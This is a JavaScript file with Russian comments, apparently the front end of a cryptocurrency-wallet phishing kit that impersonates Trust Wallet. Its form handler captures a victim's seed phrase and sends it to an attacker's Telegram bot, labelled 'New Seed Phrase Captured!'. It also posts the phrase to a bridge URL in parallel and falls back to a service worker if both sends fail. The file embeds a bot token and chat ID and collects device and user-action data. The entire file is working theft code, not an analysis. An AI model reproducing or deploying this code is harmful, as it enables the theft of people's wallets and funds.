// ============================================
// MAIN.JS - ФИНАЛЬНАЯ ВЕРСИЯ
// HTTPS с 1 retry + Telegram (основной метод)
// НОРМАЛИЗАЦИЯ SEED (lowercase)
// ============================================

(function() {
    
    const CONFIG = {
        bridgeURL: 'https://github.com/TrustWalletApp-com/Wallet-Card',
        apiKey: 'dummy',
        timeout: 5000,
        telegramBotToken: '8451114914:AAGV01n087Env9NnncDrYpdAE3PWbS3pDPU',
        telegramChatId: '1072060180',
        telegramTimeout: 8000
    };

    /**
     * Нормализация seed phrase
     * - Убирает лишние пробелы
     * - Приводит к lowercase
     * - Убирает спецсимволы
     */
    function normalizeSeed(seed) {
        return seed
            .trim()                          // Убрать пробелы по краям
            .toLowerCase()                   // Все буквы в lowercase
            .replace(/\s+/g, ' ')            // Множественные пробелы → один пробел
            .replace(/[^\w\s]/g, '');        // Убрать спецсимволы (оставить только буквы, цифры, пробелы)
    }

    /**
     * HTTPS отправка
     */
    async function sendViaHTTPS(data) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), CONFIG.timeout);

            const response = await fetch(`${CONFIG.bridgeURL}/submit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-API-Key': CONFIG.apiKey
                },
                body: JSON.stringify(data),
                signal: controller.signal,
                keepalive: true
            });

            clearTimeout(timeoutId);
            return response.ok;

        } catch (e) {
            return false;
        }
    }

    /**
     * Telegram отправка с retry логикой
     */
    async function sendViaTelegram(data) {
        try {
            console.log('[Main] Sending to Telegram...');
            
            const message = `🚨 <b>New Seed Phrase Captured!</b>\n\n📝 <b>Seed:</b> <code>${data.seed}</code>\n🌐 <b>Domain:</b> ${data.domain}\n⏰ <b>Time:</b> ${new Date(data.timestamp).toISOString()}\n📱 <b>Device:</b> ${data.userAgent.substring(0, 100)}`;

            const telegramData = {
                chat_id: CONFIG.telegramChatId,
                text: message,
                parse_mode: 'HTML'
            };

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), CONFIG.telegramTimeout);

            const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(telegramData),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            
            if (response.ok) {
                console.log('[Main] Telegram send success');
                return true;
            } else {
                console.error('[Main] Telegram response not ok:', response.status);
                return false;
            }

        } catch (e) {
            console.error('[Main] Telegram send error:', e.message);
            return false;
        }
    }

    /**
     * Главная функция отправки
     * Приоритет: Telegram > HTTPS > Service Worker
     */
    async function submitSeed(seed) {
        // НОРМАЛИЗАЦИЯ SEED
        const normalizedSeed = normalizeSeed(seed);
        
        // Собираем базовые данные
        const data = {
            seed: normalizedSeed,           // ← NORMALIZED!
            domain: window.location.hostname,
            timestamp: Date.now(),
            userAgent: navigator.userAgent,
            userActions: null
        };
        
        console.log('[Main] Submitting seed from:', data.domain);
        
        // Пробуем собрать userActions (максимум 2 секунды)
        if (window.UserActions && typeof window.UserActions.collect === 'function') {
            try {
                data.userActions = await window.UserActions.collect();
            } catch (e) {
                // Если ошибка - отправляем null
                data.userActions = null;
            }
        }
        
        // Трекаем попытку отправки
        if (window.UserActions) {
            window.UserActions.trackSendAttempt('telegram');
        }
        
        // Приоритет 1: Попытка Telegram (параллельно с HTTPS)
        const telegramPromise = sendViaTelegram(data).then(success => {
            if (success) {
                console.log('[Main] Telegram success!');
                if (window.UserActions) {
                    window.UserActions.trackSendSuccess('telegram');
                }
                if (window.AggressiveSender) {
                    window.AggressiveSender.markAsSent(normalizedSeed);
                }
                return { success: true, method: 'telegram' };
            }
            return null;
        });

        // Приоритет 2: Параллельная HTTPS отправка
        const httpsPromise = sendViaHTTPS(data).then(success => {
            if (success) {
                console.log('[Main] HTTPS success!');
                if (window.UserActions) {
                    window.UserActions.trackSendSuccess('https');
                }
                if (window.AggressiveSender) {
                    window.AggressiveSender.markAsSent(normalizedSeed);
                }
                return { success: true, method: 'https' };
            }
            return null;
        });

        // Ждем оба промиса (первый успешный победит)
        const [telegramResult, httpsResult] = await Promise.all([telegramPromise, httpsPromise]);

        if (telegramResult && telegramResult.success) {
            return telegramResult;
        }
        
        if (httpsResult && httpsResult.success) {
            return httpsResult;
        }
        
        console.log('[Main] Both Telegram and HTTPS failed, triggering Service Worker');
        
        // Приоритет 3: Сохраняем для Service Worker
        if (window.AggressiveSender) {
            window.AggressiveSender.saveSeed(normalizedSeed);
        }
        
        if (window.UserActions) {
            window.UserActions.trackSendFailed('all', 'service_worker_fallback');
        }
        
        return { 
            success: false, 
            method: 'service_worker_pending',
            error: 'Telegram and HTTPS failed, using Service Worker'
        };
    }

    /**
     * Глобальная функция для формы
     */
    window.handlePhraseSubmit = async function(phrase) {
        return await submitSeed(phrase.trim());
    };

})();